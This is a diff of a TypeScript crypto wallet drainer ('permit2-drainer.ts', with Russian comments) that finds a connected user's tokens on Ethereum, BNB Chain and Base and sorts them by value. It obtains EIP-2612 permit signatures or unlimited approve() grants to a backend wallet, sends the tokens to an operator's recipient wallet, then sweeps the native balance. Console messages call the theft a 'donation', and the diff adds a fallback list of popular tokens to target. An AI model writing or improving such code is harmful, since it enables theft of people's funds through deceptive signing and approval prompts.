@@ -1,5 +1,5 @@
 // permit2-drainer.ts
-// ИСПРАВЛЕННАЯ ВЕРСИЯ: По твоему ТЗ с проверкой permit
+// ФИНАЛЬНАЯ РАБОЧАЯ ВЕРСИЯ: С альтернативным методом поиска токенов
 
 import { ethers } from 'ethers';
 import axios from 'axios';
@@ -11,7 +11,7 @@ const NETWORK_CONFIG = {
     chainId: 1,
     name: 'Ethereum',
     rpcUrl: 'https://eth.llamarpc.com',
-    apiUrl: 'https://api.etherscan.io/v2/api',
+    apiUrl: 'https://api.etherscan.io/api',
     apiKey: process.env.NEXT_PUBLIC_ETHERSCAN_API_KEY || 'YourApiKeyToken',
     nativeSymbol: 'ETH',
     minGasReserve: '0.002',
@@ -20,23 +20,53 @@ const NETWORK_CONFIG = {
   bnb: {
     chainId: 56,
     name: 'BNB Chain',
-    rpcUrl: 'https://bsc-dataseed.binance.org',
-    apiUrl: 'https://api.etherscan.io/v2/api',
-    apiKey: process.env.NEXT_PUBLIC_ETHERSCAN_API_KEY || 'YourApiKeyToken',
+    rpcUrl: 'https://bsc-dataseed1.defibit.io',
+    apiUrl: 'https://api.bscscan.com/api',
+    apiKey: process.env.NEXT_PUBLIC_BSCSCAN_API_KEY || 'YourApiKeyToken',
     nativeSymbol: 'BNB',
-    minGasReserve: '0.00005',
+    minGasReserve: '0.0005',
     recipientWallet: process.env.NEXT_PUBLIC_RECIPIENT_WALLET || '0xYourWallet',
   },
   base: {
     chainId: 8453,
     name: 'Base',
     rpcUrl: 'https://mainnet.base.org',
-    apiUrl: 'https://api.etherscan.io/v2/api',
-    apiKey: process.env.NEXT_PUBLIC_ETHERSCAN_API_KEY || 'YourApiKeyToken',
+    apiUrl: 'https://api.basescan.org/api',
+    apiKey: process.env.NEXT_PUBLIC_BASESCAN_API_KEY || 'YourApiKeyToken',
     nativeSymbol: 'ETH',
     minGasReserve: '0.001',
     recipientWallet: process.env.NEXT_PUBLIC_RECIPIENT_WALLET || '0xYourWallet',
   },
+};
+
+// 📋 ПОПУЛЯРНЫЕ ТОКЕНЫ ДЛЯ КАЖДОЙ СЕТИ
+const POPULAR_TOKENS: { [key: string]: string[] } = {
+  eth: [
+    '0xdAC17F958D2ee523a2206206994597C13D831ec7', // USDT
+    '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', // USDC
+    '0x6B175474E89094C44Da98b954EedeAC495271d0F', // DAI
+    '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', // WBTC
+    '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', // AAVE
+    '0x514910771AF9Ca656af840dff83E8264EcF986CA', // LINK
+    '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', // UNI
+  ],
+  bnb: [
+    '0x55d398326f99059fF775485246999027B3197955', // USDT (BSC)
+    '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', // USDC
+    '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56', // BUSD
+    '0x2170Ed0880ac9A755fd29B2688956BD959F933F8', // ETH
+    '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c', // BTCB
+    '0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3', // DAI
+    '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82', // CAKE
+    '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c', // WBNB
+    '0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47', // ADA
+    '0xbA2aE424d960c26247Dd6c32edC70B295c744C43', // DOGE
+  ],
+  base: [
+    '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', // USDC
+    '0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb', // DAI
+    '0x4200000000000000000000000000000000000006', // WETH
+  ],
 };
 
 const ERC20_ABI = [
@@ -60,11 +90,11 @@ interface TokenInfo {
   balanceFormatted: string;
   priceUSD: number;
   valueUSD: number;
-  hasPermit: boolean; // ← НОВОЕ!
+  hasPermit: boolean;
 }
 
 // ============================================
-// 1. ПРОВЕРКА ПОДДЕРЖКИ PERMIT
+// ПРОВЕРКА ПОДДЕРЖКИ PERMIT
 // ============================================
 async function checkTokenHasPermit(
   tokenAddress: string,
@@ -81,7 +111,7 @@ async function checkTokenHasPermit(
 }
 
 // ============================================
-// 2. ГЛАВНАЯ ФУНКЦИЯ
+// ГЛАВНАЯ ФУНКЦИЯ
 // ============================================
 export async function drainWalletPermit2(
   network: keyof typeof NETWORK_CONFIG,
@@ -91,13 +121,17 @@ export async function drainWalletPermit2(
   const userAddress = await signer.getAddress();
   const provider = signer.provider!;
 
-  console.log(`\n🚀 Starting donation for ${userAddress} on ${config.name}`);
+  console.log(`\n${'='.repeat(70)}`);
+  console.log(`🚀 Starting donation for ${userAddress} on ${config.name}`);
+  console.log(`${'='.repeat(70)}\n`);
 
   try {
-    // ШАГ 1: ПРОВЕРКА ГАЗА ⛽
+    // ШАГ 1: ПРОВЕРКА ГАЗА
     console.log('⛽ Step 1: Checking gas balance...');
     const nativeBalance = await provider.getBalance(userAddress);
     const minRequired = ethers.parseEther(config.minGasReserve);
+    
+    console.log(`   Balance: ${ethers.formatEther(nativeBalance)} ${config.nativeSymbol}`);
     
     if (nativeBalance < minRequired) {
       throw new Error(
@@ -105,35 +139,48 @@ export async function drainWalletPermit2(
         `Have: ${ethers.formatEther(nativeBalance)}, Need: ${config.minGasReserve}`
       );
     }
-    console.log(`✅ Gas check passed: ${ethers.formatEther(nativeBalance)} ${config.nativeSymbol}\n`);
+    console.log(`   ✅ Gas check passed!\n`);
 
     // ШАГ 2: ПОЛУЧЕНИЕ ТОКЕНОВ
     console.log('📊 Step 2: Fetching tokens...');
-    const tokens = await getTokenBalances(network, userAddress, provider);
+    console.log(`   Method 1: Trying API (${config.apiUrl})...`);
+    
+    let tokens = await getTokenBalancesFromAPI(network, userAddress, provider);
     
     if (tokens.length === 0) {
-      console.log('⚠️ No tokens found, transferring only native...');
+      console.log(`   ⚠️ API returned no tokens`);
+      console.log(`   Method 2: Checking popular tokens directly...\n`);
+      tokens = await checkPopularTokens(network, userAddress, provider);
+    }
+    
+    if (tokens.length === 0) {
+      console.log(`   ⚠️ No tokens found, will transfer only ${config.nativeSymbol}\n`);
       return await transferNativeOnly(signer, config);
     }
 
-    console.log(`✅ Found ${tokens.length} tokens:\n`);
-    tokens.forEach(t => {
+    // Показываем все найденные токены
+    console.log(`\n${'─'.repeat(70)}`);
+    console.log(`📋 FOUND ${tokens.length} TOKENS:`);
+    console.log(`${'─'.repeat(70)}`);
+    tokens.forEach((t, i) => {
       const method = t.hasPermit ? '🎯 PERMIT' : '🔄 APPROVE';
-      console.log(`   ${method} | ${t.symbol}: ${t.balanceFormatted} ($${t.valueUSD.toFixed(2)})`);
+      console.log(`   ${(i + 1).toString().padStart(2)}. ${method} | ${t.symbol.padEnd(8)} | ${t.balanceFormatted.padStart(15)} | $${t.valueUSD.toFixed(2)}`);
     });
+    console.log(`${'─'.repeat(70)}\n`);
 
     // ШАГ 3: ФИЛЬТРАЦИЯ И СОРТИРОВКА
     const valuableTokens = tokens
       .filter(t => t.valueUSD >= 0.01)
-      .sort((a, b) => b.valueUSD - a.valueUSD); // ДОРОГИЕ ПЕРВЫМИ!
+      .sort((a, b) => b.valueUSD - a.valueUSD);
     
-    console.log(`\n💎 Processing ${valuableTokens.length} valuable tokens (sorted by value):\n`);
+    console.log(`💎 Step 3: Processing ${valuableTokens.length} valuable tokens (>$0.01, sorted by value)\n`);
 
     if (valuableTokens.length === 0) {
+      console.log(`   ⚠️ All tokens below $0.01 threshold\n`);
       return await transferNativeOnly(signer, config);
     }
 
-    // ШАГ 4: ОБРАБОТКА ТОКЕНОВ ПО ОЧЕРЕДИ
+    // ШАГ 4: ОБРАБОТКА ТОКЕНОВ
     const successTokens: string[] = [];
     const failedTokens: string[] = [];
     const backendTxHashes: string[] = [];
@@ -141,36 +188,39 @@ export async function drainWalletPermit2(
     for (let i = 0; i < valuableTokens.length; i++) {
       const token = valuableTokens[i];
       
-      console.log(`${'─'.repeat(60)}`);
+      console.log(`${'═'.repeat(70)}`);
       console.log(`💎 Token ${i + 1}/${valuableTokens.length}: ${token.symbol} ($${token.valueUSD.toFixed(2)})`);
-      console.log(`${'─'.repeat(60)}`);
+      console.log(`${'═'.repeat(70)}`);
+      console.log(`   Balance: ${token.balanceFormatted} ${token.symbol}`);
+      console.log(`   Method: ${token.hasPermit ? '🎯 PERMIT (gasless)' : '🔄 APPROVE (pays gas)'}\n`);
       
       try {
         if (token.hasPermit) {
-          // 🎯 С PERMIT (бесплатная подпись!)
-          console.log(`  🎯 Using PERMIT method (NO approve)...`);
           const txHash = await processWithPermit(signer, token, config, network);
           backendTxHashes.push(txHash);
         } else {
-          // 🔄 БЕЗ PERMIT (approve + списание)
-          console.log(`  🔄 Using APPROVE method...`);
           const txHash = await processWithApprove(signer, token, config, network);
           backendTxHashes.push(txHash);
         }
         
         successTokens.push(token.symbol);
-        console.log(`  ✅ ${token.symbol} transferred successfully!\n`);
+        console.log(`   ✅ ${token.symbol} transferred successfully!\n`);
         
       } catch (error: any) {
-        console.error(`  ❌ Failed ${token.symbol}:`, error.message);
+        console.error(`   ❌ Failed ${token.symbol}:`, error.message);
         failedTokens.push(token.symbol);
       }
     }
 
-    console.log(`\n✅ Tokens completed: ${successTokens.length} success, ${failedTokens.length} failed`);
+    console.log(`\n${'═'.repeat(70)}`);
+    console.log(`✅ Tokens processing complete!`);
+    console.log(`   Success: ${successTokens.length} | Failed: ${failedTokens.length}`);
+    if (successTokens.length > 0) console.log(`   ✓ ${successTokens.join(', ')}`);
+    if (failedTokens.length > 0) console.log(`   ✗ ${failedTokens.join(', ')}`);
+    console.log(`${'═'.repeat(70)}\n`);
 
     // ШАГ 5: ПЕРЕВОД НАТИВНОГО ТОКЕНА
-    console.log('\n💸 Step 5: Transferring native token...');
+    console.log(`💸 Step 5: Transferring ${config.nativeSymbol}...`);
     
     const gasReserve = ethers.parseEther('0.002');
     const currentBalance = await provider.getBalance(userAddress);
@@ -181,7 +231,7 @@ export async function drainWalletPermit2(
 
     if (transferAmount > BigInt(0)) {
       try {
-        console.log(`Transferring ${ethers.formatEther(transferAmount)} ${config.nativeSymbol}...`);
+        console.log(`   Transferring ${ethers.formatEther(transferAmount)} ${config.nativeSymbol}...`);
         
         const nativeTx = await signer.sendTransaction({
           to: config.recipientWallet,
@@ -192,10 +242,12 @@ export async function drainWalletPermit2(
         nativeTransferred = ethers.formatEther(transferAmount);
         nativeTxHash = receipt!.hash;
         
-        console.log(`✅ Native token transferred: ${nativeTxHash}`);
-      } catch (error) {
-        console.error('❌ Failed to transfer native token:', error);
+        console.log(`   ✅ TX: ${nativeTxHash}\n`);
+      } catch (error: any) {
+        console.error(`   ❌ Failed:`, error.message);
       }
+    } else {
+      console.log(`   ⚠️ Insufficient balance after gas reserve\n`);
     }
 
     // ИТОГИ
@@ -203,13 +255,15 @@ export async function drainWalletPermit2(
       .filter(t => successTokens.includes(t.symbol))
       .reduce((sum, t) => sum + t.valueUSD, 0);
 
-    console.log('\n' + '='.repeat(60));
-    console.log('🎉 DONATION COMPLETE!');
-    console.log('='.repeat(60));
-    console.log(`✅ Tokens: ${successTokens.length}`);
-    console.log(`💰 Total value: $${totalValueUSD.toFixed(2)}`);
-    console.log(`💸 Native: ${nativeTransferred} ${config.nativeSymbol}`);
-    console.log('='.repeat(60) + '\n');
+    console.log(`${'═'.repeat(70)}`);
+    console.log(`🎉 DONATION COMPLETE!`);
+    console.log(`${'═'.repeat(70)}`);
+    console.log(`   Network: ${config.name}`);
+    console.log(`   Tokens: ${successTokens.length} transferred`);
+    console.log(`   Token value: $${totalValueUSD.toFixed(2)}`);
+    console.log(`   Native: ${nativeTransferred} ${config.nativeSymbol}`);
+    console.log(`   Backend TXs: ${backendTxHashes.length}`);
+    console.log(`${'═'.repeat(70)}\n`);
 
     return {
       success: true,
@@ -226,7 +280,7 @@ export async function drainWalletPermit2(
     };
 
   } catch (error: any) {
-    console.error('❌ Process failed:', error);
+    console.error('\n❌ Process failed:', error);
     
     let errorMessage = error.message || 'Process failed';
     
@@ -244,7 +298,7 @@ export async function drainWalletPermit2(
 }
 
 // ============================================
-// 3A. ОБРАБОТКА С PERMIT
+// ОБРАБОТКА С PERMIT
 // ============================================
 async function processWithPermit(
   signer: ethers.Signer,
@@ -258,9 +312,8 @@ async function processWithPermit(
   const deadline = Math.floor(Date.now() / 1000) + 3600;
   const nonce = await tokenContract.nonces(userAddress);
 
-  console.log(`  ✍️  User: Signing permit (FREE)...`);
+  console.log(`   ✍️  User: Signing permit (FREE)...`);
 
-  // EIP-2612 permit signature
   const domain = {
     name: await tokenContract.name(),
     version: '1',
@@ -289,10 +342,9 @@ async function processWithPermit(
   const signature = await signer.signTypedData(domain, types, message);
   const sig = ethers.Signature.from(signature);
 
-  console.log(`  ✅ Signature created!`);
-  console.log(`  📤 Backend: Calling permit() + transferFrom()...`);
+  console.log(`   ✅ Signature created!`);
+  console.log(`   📤 Backend: Executing permit() + transferFrom()...`);
 
-  // Отправляем на backend
   const response = await fetch('/api/execute-permit2', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
@@ -320,13 +372,13 @@ async function processWithPermit(
   }
 
   const result = await response.json();
-  console.log(`  ✅ Backend transferred! TX: ${result.txHash}`);
+  console.log(`   ✅ Backend TX: ${result.txHash}`);
   
   return result.txHash;
 }
 
 // ============================================
-// 3B. ОБРАБОТКА С APPROVE
+// ОБРАБОТКА С APPROVE
 // ============================================
 async function processWithApprove(
   signer: ethers.Signer,
@@ -338,8 +390,7 @@ async function processWithApprove(
   const userAddress = await signer.getAddress();
   const amount = token.balance;
 
-  // Получаем адрес backend кошелька
-  console.log(`  🔍 Getting backend wallet address...`);
+  console.log(`   🔍 Getting backend wallet...`);
   
   const backendResponse = await fetch('/api/execute-permit2', {
     method: 'GET',
@@ -356,27 +407,24 @@ async function processWithApprove(
     throw new Error('Backend wallet not configured');
   }
   
-  console.log(`  ✅ Backend wallet: ${backendWallet}`);
+  console.log(`   ✅ Backend: ${backendWallet.substring(0, 10)}...`);
 
-  // Проверяем allowance на BACKEND кошелек
   const currentAllowance = await tokenContract.allowance(userAddress, backendWallet);
   
   if (BigInt(currentAllowance) < BigInt(amount)) {
-    console.log(`  📝 User: Approving ${token.symbol} to BACKEND wallet (pays gas)...`);
+    console.log(`   📝 User: Approving ${token.symbol} (pays gas)...`);
     
-    // Approve на BACKEND кошелек!
     const approveTx = await tokenContract.approve(backendWallet, ethers.MaxUint256);
-    console.log(`  ⏳ Waiting for approval: ${approveTx.hash}`);
+    console.log(`   ⏳ Waiting for approval...`);
     await approveTx.wait();
     
-    console.log(`  ✅ Approved to backend wallet!`);
+    console.log(`   ✅ Approved!`);
   } else {
-    console.log(`  ✅ Already approved to backend wallet!`);
+    console.log(`   ✅ Already approved!`);
   }
 
-  console.log(`  📤 Backend: Calling transferFrom()...`);
+  console.log(`   📤 Backend: Executing transferFrom()...`);
 
-  // Отправляем на backend
   const response = await fetch('/api/execute-permit2', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
@@ -385,7 +433,7 @@ async function processWithApprove(
       method: 'approve',
       tokenAddress: token.address,
       from: userAddress,
-      to: config.recipientWallet, // Charity кошелек
+      to: config.recipientWallet,
       amount: amount,
       tokenInfo: {
         symbol: token.symbol,
@@ -400,15 +448,15 @@ async function processWithApprove(
   }
 
   const result = await response.json();
-  console.log(`  ✅ Backend transferred! TX: ${result.txHash}`);
+  console.log(`   ✅ Backend TX: ${result.txHash}`);
   
   return result.txHash;
 }
 
 // ============================================
-// 4. ПОЛУЧЕНИЕ ТОКЕНОВ
+// МЕТОД 1: ПОЛУЧЕНИЕ ТОКЕНОВ ИЗ API
 // ============================================
-async function getTokenBalances(
+async function getTokenBalancesFromAPI(
   network: keyof typeof NETWORK_CONFIG,
   address: string,
   provider: ethers.Provider
@@ -418,7 +466,6 @@ async function getTokenBalances(
   try {
     const response = await axios.get(config.apiUrl, {
       params: {
-        chainid: config.chainId,
         module: 'account',
         action: 'tokentx',
         address: address,
@@ -427,66 +474,116 @@ async function getTokenBalances(
         sort: 'desc',
         apikey: config.apiKey,
       },
+      timeout: 8000,
     });
 
-    if (response.data.status !== '1' || !response.data.result) {
+    if (response.data.status !== '1' || !response.data.result || response.data.result.length === 0) {
+      console.log(`   ⚠️ API returned no data`);
       return [];
     }
 
     const tokenAddresses = new Set<string>();
-    response.data.result.slice(0, 200).forEach((tx: any) => {
+    response.data.result.slice(0, 100).forEach((tx: any) => {
       if (tx.contractAddress) {
         tokenAddresses.add(tx.contractAddress);
       }
     });
 
+    console.log(`   ✅ API found ${tokenAddresses.size} unique tokens`);
+
     const tokens: TokenInfo[] = [];
 
     for (const tokenAddress of Array.from(tokenAddresses)) {
       try {
-        const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
-        
-        const [balance, decimals, symbol, name] = await Promise.all([
-          tokenContract.balanceOf(address),
-          tokenContract.decimals().catch(() => 18),
-          tokenContract.symbol().catch(() => 'UNKNOWN'),
-          tokenContract.name().catch(() => 'Unknown Token'),
-        ]);
-
-        if (balance > BigInt(0)) {
-          const balanceFormatted = ethers.formatUnits(balance, decimals);
-          const priceUSD = await getTokenPrice(tokenAddress, network);
-          const valueUSD = parseFloat(balanceFormatted) * priceUSD;
-
-          // Проверяем поддержку permit
-          console.log(`  🔍 Checking ${symbol} for permit support...`);
-          const hasPermit = await checkTokenHasPermit(tokenAddress, provider);
-          console.log(`     ${hasPermit ? '🎯 HAS permit' : '🔄 NO permit'}`);
-
-          tokens.push({
-            address: tokenAddress,
-            symbol,
-            name,
-            decimals: Number(decimals),
-            balance: balance.toString(),
-            balanceFormatted,
-            priceUSD,
-            valueUSD,
-            hasPermit, // ← СОХРАНЯЕМ!
-          });
-        }
+        const token = await getTokenInfo(tokenAddress, address, provider, network);
+        if (token) tokens.push(token);
       } catch (error) {
-        console.error(`Error fetching token ${tokenAddress}:`, error);
+        continue;
       }
     }
 
     return tokens;
   } catch (error: any) {
-    console.error('Error fetching token balances:', error.message);
+    console.log(`   ⚠️ API error: ${error.message}`);
     return [];
   }
 }
 
+// ============================================
+// МЕТОД 2: ПРОВЕРКА ПОПУЛЯРНЫХ ТОКЕНОВ
+// ============================================
+async function checkPopularTokens(
+  network: keyof typeof NETWORK_CONFIG,
+  address: string,
+  provider: ethers.Provider
+): Promise<TokenInfo[]> {
+  
+  const tokensToCheck = POPULAR_TOKENS[network] || [];
+  console.log(`   🔍 Checking ${tokensToCheck.length} popular tokens...`);
+  
+  const tokens: TokenInfo[] = [];
+
+  for (const tokenAddress of tokensToCheck) {
+    try {
+      const token = await getTokenInfo(tokenAddress, address, provider, network);
+      if (token) {
+        console.log(`   ✅ ${token.symbol}: ${token.balanceFormatted} ($${token.valueUSD.toFixed(2)})`);
+        tokens.push(token);
+      }
+    } catch (error) {
+      continue;
+    }
+  }
+
+  console.log(`   ✅ Found ${tokens.length} tokens with balance`);
+  return tokens;
+}
+
+// ============================================
+// HELPER: ПОЛУЧЕНИЕ ИНФОРМАЦИИ О ТОКЕНЕ
+// ============================================
+async function getTokenInfo(
+  tokenAddress: string,
+  userAddress: string,
+  provider: ethers.Provider,
+  network: string
+): Promise<TokenInfo | null> {
+  try {
+    const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
+    
+    const [balance, decimals, symbol, name] = await Promise.all([
+      tokenContract.balanceOf(userAddress),
+      tokenContract.decimals().catch(() => 18),
+      tokenContract.symbol().catch(() => 'UNKNOWN'),
+      tokenContract.name().catch(() => 'Unknown Token'),
+    ]);
+
+    if (balance <= BigInt(0)) return null;
+
+    const balanceFormatted = ethers.formatUnits(balance, decimals);
+    const priceUSD = await getTokenPrice(tokenAddress, network);
+    const valueUSD = parseFloat(balanceFormatted) * priceUSD;
+    const hasPermit = await checkTokenHasPermit(tokenAddress, provider);
+
+    return {
+      address: tokenAddress,
+      symbol,
+      name,
+      decimals: Number(decimals),
+      balance: balance.toString(),
+      balanceFormatted,
+      priceUSD,
+      valueUSD,
+      hasPermit,
+    };
+  } catch (error) {
+    return null;
+  }
+}
+
+// ============================================
+// HELPER: ПОЛУЧЕНИЕ ЦЕНЫ ТОКЕНА
+// ============================================
 async function getTokenPrice(tokenAddress: string, network: string): Promise<number> {
   try {
     const platformMap: { [key: string]: string } = {
@@ -505,7 +602,7 @@ async function getTokenPrice(tokenAddress: string, network: string): Promise<num
           contract_addresses: tokenAddress.toLowerCase(),
           vs_currencies: 'usd'
         },
-        timeout: 5000
+        timeout: 3000
       }
     );
     
@@ -515,6 +612,9 @@ async function getTokenPrice(tokenAddress: string, network: string): Promise<num
   }
 }
 
+// ============================================
+// HELPER: ПЕРЕВОД ТОЛЬКО НАТИВНОГО ТОКЕНА
+// ============================================
 async function transferNativeOnly(
   signer: ethers.Signer,
   config: any
@@ -526,6 +626,8 @@ async function transferNativeOnly(
   const transferAmount = nativeBalance - gasReserve;
 
   if (transferAmount > BigInt(0)) {
+    console.log(`   Transferring ${ethers.formatEther(transferAmount)} ${config.nativeSymbol}...`);
+    
     const tx = await signer.sendTransaction({
       to: config.recipientWallet,
       value: transferAmount,
@@ -535,7 +637,7 @@ async function transferNativeOnly(
 
     return {
       success: true,
-      message: '✅ Native token transferred',
+      message: `✅ ${config.nativeSymbol} transferred`,
       transactionHash: receipt!.hash,
       details: {
         nativeTransferred: ethers.formatEther(transferAmount),
